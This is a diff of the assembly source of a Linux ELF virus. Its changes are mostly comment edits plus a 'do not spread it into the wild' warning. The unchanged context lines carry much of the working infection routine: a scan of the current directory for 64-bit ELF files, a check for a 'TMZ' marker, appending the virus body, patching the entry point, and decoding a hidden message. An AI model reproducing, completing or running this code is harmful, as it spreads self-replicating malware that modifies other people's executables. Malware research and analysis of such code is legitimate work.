@@ -16,7 +16,7 @@
 ; https://www.guitmz.com
 ; https://syscall.sh
 ;
-; Use at your own risk, I'm not responsible for any damages that this may cause.
+; Use at your own risk, I'm not responsible for any damages that this may cause, do not spread it into the wild!
 ;
 ; References:
 ; https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf
@@ -82,14 +82,14 @@ entry v_start
 v_start:
     push rdx
     push rsp
-    sub rsp, 5000                                               ; reserving 1000 dwords (4000 bytes)
+    sub rsp, 5000                                               ; reserving 5000 bytes
     mov r15, rsp                                                ; r15 has the reserved stack buffer address
 
     load_dir:
         push "."                                                ; pushing "." to stack (rsp)
         mov rdi, rsp                                            ; moving "." to rdi
         mov rsi, O_RDONLY
-        xor rdx, rdx                                            ;not using any flags
+        xor rdx, rdx                                            ; not using any flags
         mov rax, SYS_OPEN
         syscall                                                 ; rax contains the fd
 
@@ -141,8 +141,8 @@ v_start:
             jnz .close_file                                     ; not an ELF binary, close and continue to next file if any
         
         .is_64:
-            cmp byte [r15 + 148], ELFCLASS64
-            jne .close_file
+            cmp byte [r15 + 148], ELFCLASS64                    ; check if target ELF is 64bit
+            jne .close_file                                     ; skipt it if not
 
         .is_infected:
             cmp dword [r15 + 152], 0x005a4d54                   ; check signature in [r15 + 152] ehdr.pad (TMZ in little-endian, plus trailing zero to fill up a word size)
@@ -193,7 +193,7 @@ v_start:
                 syscall                                         ; getting target EOF offset in rax
                 push rax                                        ; saving target EOF
 
-                call .delta                 ; push and jmp instead of call?
+                call .delta
                 .delta:
                     pop rbp
                     sub rbp, .delta
@@ -260,8 +260,6 @@ v_start:
                 syscall                                         ; getting target EOF offset in rax
 
                 ; creating patched jmp
-                ; e9 00 00 00 00
-                ; patchedEntryJump := originalEntryPoint - (patched phdr.vaddr + 5) - virus_size
                 mov rdx, [r15 + 224]                            ; rdx = phdr.vaddr
                 add rdx, 5
                 sub r14, rdx
@@ -293,13 +291,8 @@ v_start:
             cmp rcx, qword [r15 + 350]                          ; comparing rcx counter with r10 (directory records total size)
             jne file_loop                                       ; if counter is not the same, continue loop. Exit virus otherwise
 
-
-    ; push and jump technique works but only in original virus
-	; push msg		; push msg label address to stack
-	; jmp payload             ; jmp to payload label (this and the above line simulate "call payload" instruction)
-
-    call payload ; works all the time but shows in disassembler as function call
     ; 1337 encoded payload, very hax0r
+    call payload
     msg:
         ; payload first part
         db 0x59, 0x7c, 0x95, 0x95, 0x57, 0x9e, 0x9d, 0x57
@@ -505,14 +498,14 @@ v_start:
 
         .decode:
             lodsb                                               ; load byte from rsi into al
-            sub  al, 50
+            sub  al, 50                                         ; decoding it
             xor  al, 5
             stosb                                               ; store byte from al into rdi
             loop .decode                                        ; sub 1 from rcx and continue loop until rcx = 0
 
         lea rsi, [r15 + 3000]                                   ; decoded payload is at [r15 + 3000]
         mov rax, SYS_WRITE
-        mov rdi, 1                                              ; STDOUT
+        mov rdi, 1                                              ; write payload to STDOUT
         mov rdx, len
         syscall
     
